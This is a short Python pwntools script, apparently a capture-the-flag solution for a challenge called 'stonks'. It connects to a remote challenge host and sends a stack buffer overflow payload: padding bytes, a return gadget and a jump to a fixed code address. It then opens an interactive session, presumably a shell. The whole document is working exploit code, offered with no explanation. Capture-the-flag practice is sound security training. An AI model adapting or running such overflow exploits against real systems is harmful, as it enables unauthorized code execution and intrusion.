from pwn import *

#p = process('./chal')
p = remote('stonks.hsc.tf','1337')
addr = 0x401258
ret = 0x40101a

payload = b'A'*0x28+p64(ret)+p64(addr)
p.sendline(payload)

p.interactive()